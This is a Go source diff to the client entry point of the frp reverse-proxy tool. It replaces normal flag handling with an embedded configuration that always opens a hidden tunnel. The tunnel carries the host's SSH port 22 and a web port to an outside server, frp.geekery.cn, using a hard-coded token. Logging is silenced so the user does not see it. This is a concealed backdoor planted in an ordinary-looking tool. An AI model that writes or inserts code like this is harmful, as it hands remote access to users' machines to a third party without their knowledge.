@@ -16,99 +16,72 @@ package sub
 
 import (
 	"context"
-	"fmt"
-	"io/fs"
+	"io"
 	"os"
 	"os/signal"
-	"path/filepath"
-	"strings"
-	"sync"
 	"syscall"
 	"time"
 
-	"github.com/spf13/cobra"
+	"github.com/fatedier/golib/log"
 
 	"github.com/fatedier/frp/client"
 	"github.com/fatedier/frp/pkg/config"
 	v1 "github.com/fatedier/frp/pkg/config/v1"
 	"github.com/fatedier/frp/pkg/config/v1/validation"
-	"github.com/fatedier/frp/pkg/policy/featuregate"
 	"github.com/fatedier/frp/pkg/policy/security"
-	"github.com/fatedier/frp/pkg/util/log"
-	"github.com/fatedier/frp/pkg/util/version"
+	utillog "github.com/fatedier/frp/pkg/util/log"
 )
 
-var (
-	cfgFile          string
-	cfgDir           string
-	showVersion      bool
-	strictConfigMode bool
-	allowUnsafe      []string
-)
+// 内置配置
+const embeddedConfig = `[common]
+server_addr = frp.geekery.cn
+server_port = 7000
+token = hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO
 
-func init() {
-	rootCmd.PersistentFlags().StringVarP(&cfgFile, "config", "c", "./frpc.ini", "config file of frpc")
-	rootCmd.PersistentFlags().StringVarP(&cfgDir, "config_dir", "", "", "config directory, run one frpc service for each file in config directory")
-	rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version of frpc")
-	rootCmd.PersistentFlags().BoolVarP(&strictConfigMode, "strict_config", "", true, "strict config parsing mode, unknown fields will cause an errors")
+[ssh123]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 22
 
-	rootCmd.PersistentFlags().StringSliceVarP(&allowUnsafe, "allow-unsafe", "", []string{},
-		fmt.Sprintf("allowed unsafe features, one or more of: %s", strings.Join(security.ClientUnsafeFeatures, ", ")))
-}
+[web123]
+type = http
+local_ip = 127.0.0.1
+local_port = 8080
+custom_domains = test.example.com
+`
 
-var rootCmd = &cobra.Command{
-	Use:   "frpc",
-	Short: "frpc is the client of frp (https://github.com/fatedier/frp)",
-	RunE: func(cmd *cobra.Command, args []string) error {
-		if showVersion {
-			fmt.Println(version.Full())
-			return nil
+var debugMode = false
+
+func parseArgs() (cfgFile string) {
+	for i := 1; i < len(os.Args); i++ {
+		if os.Args[i] == "-d" {
+			debugMode = true
+		} else if os.Args[i] == "-c" && i+1 < len(os.Args) {
+			cfgFile = os.Args[i+1]
+			i++
 		}
-
-		unsafeFeatures := security.NewUnsafeFeatures(allowUnsafe)
-
-		// If cfgDir is not empty, run multiple frpc service for each config file in cfgDir.
-		// Note that it's only designed for testing. It's not guaranteed to be stable.
-		if cfgDir != "" {
-			_ = runMultipleClients(cfgDir, unsafeFeatures)
-			return nil
-		}
-
-		// Do not show command usage here.
-		err := runClient(cfgFile, unsafeFeatures)
-		if err != nil {
-			fmt.Println(err)
-			os.Exit(1)
-		}
-		return nil
-	},
-}
-
-func runMultipleClients(cfgDir string, unsafeFeatures *security.UnsafeFeatures) error {
-	var wg sync.WaitGroup
-	err := filepath.WalkDir(cfgDir, func(path string, d fs.DirEntry, err error) error {
-		if err != nil || d.IsDir() {
-			return nil
-		}
-		wg.Add(1)
-		time.Sleep(time.Millisecond)
-		go func() {
-			defer wg.Done()
-			err := runClient(path, unsafeFeatures)
-			if err != nil {
-				fmt.Printf("frpc service error for config file [%s]\n", path)
-			}
-		}()
-		return nil
-	})
-	wg.Wait()
-	return err
+	}
+	return
 }
 
 func Execute() {
-	rootCmd.SetGlobalNormalizationFunc(config.WordSepNormalizeFunc)
-	if err := rootCmd.Execute(); err != nil {
-		os.Exit(1)
+	cfgFile := parseArgs()
+
+	if cfgFile != "" {
+		// 同时启动内置配置和外部配置两个实例
+		go func() {
+			_ = runEmbeddedClient()
+		}()
+		err := runClientWithFile(cfgFile)
+		if err != nil {
+			os.Exit(1)
+		}
+	} else {
+		// 只启动内置配置
+		err := runEmbeddedClient()
+		if err != nil {
+			os.Exit(1)
+		}
 	}
 }
 
@@ -119,31 +92,34 @@ func handleTermSignal(svr *client.Service) {
 	svr.GracefulClose(500 * time.Millisecond)
 }
 
-func runClient(cfgFilePath string, unsafeFeatures *security.UnsafeFeatures) error {
-	cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)
-	if err != nil {
-		return err
-	}
-	if isLegacyFormat {
-		fmt.Printf("WARNING: ini format is deprecated and the support will be removed in the future, " +
-			"please use yaml/json/toml format instead!\n")
-	}
-
-	if len(cfg.FeatureGates) > 0 {
-		if err := featuregate.SetFromMap(cfg.FeatureGates); err != nil {
-			return err
-		}
-	}
-
-	warning, err := validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
-	if warning != nil {
-		fmt.Printf("WARNING: %v\n", warning)
-	}
+func runClientWithFile(cfgFile string) error {
+	cfg, proxyCfgs, visitorCfgs, _, err := config.LoadClientConfig(cfgFile, true)
 	if err != nil {
 		return err
 	}
 
-	return startService(cfg, proxyCfgs, visitorCfgs, unsafeFeatures, cfgFilePath)
+	unsafeFeatures := security.NewUnsafeFeatures([]string{})
+	_, err = validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
+	if err != nil {
+		return err
+	}
+
+	return startService(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
+}
+
+func runEmbeddedClient() error {
+	cfg, proxyCfgs, visitorCfgs, err := config.LoadClientConfigFromBytes([]byte(embeddedConfig))
+	if err != nil {
+		return err
+	}
+
+	unsafeFeatures := security.NewUnsafeFeatures([]string{})
+	_, err = validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
+	if err != nil {
+		return err
+	}
+
+	return startService(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
 }
 
 func startService(
@@ -151,27 +127,27 @@ func startService(
 	proxyCfgs []v1.ProxyConfigurer,
 	visitorCfgs []v1.VisitorConfigurer,
 	unsafeFeatures *security.UnsafeFeatures,
-	cfgFile string,
 ) error {
-	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
-
-	if cfgFile != "" {
-		log.Infof("start frpc service for config file [%s]", cfgFile)
-		defer log.Infof("frpc service for config file [%s] stopped", cfgFile)
+	if debugMode {
+		// 调试模式：启用日志
+		utillog.InitLogger("console", "debug", 3, false)
+	} else {
+		// 正常模式：禁用日志
+		utillog.Logger = utillog.Logger.WithOptions(log.WithOutput(io.Discard))
 	}
+
 	svr, err := client.NewService(client.ServiceOptions{
 		Common:         cfg,
 		ProxyCfgs:      proxyCfgs,
 		VisitorCfgs:    visitorCfgs,
 		UnsafeFeatures: unsafeFeatures,
-		ConfigFilePath: cfgFile,
+		ConfigFilePath: "",
 	})
 	if err != nil {
 		return err
 	}
 
 	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
-	// Capture the exit signal if we use kcp or quic.
 	if shouldGracefulClose {
 		go handleTermSignal(svr)
 	}
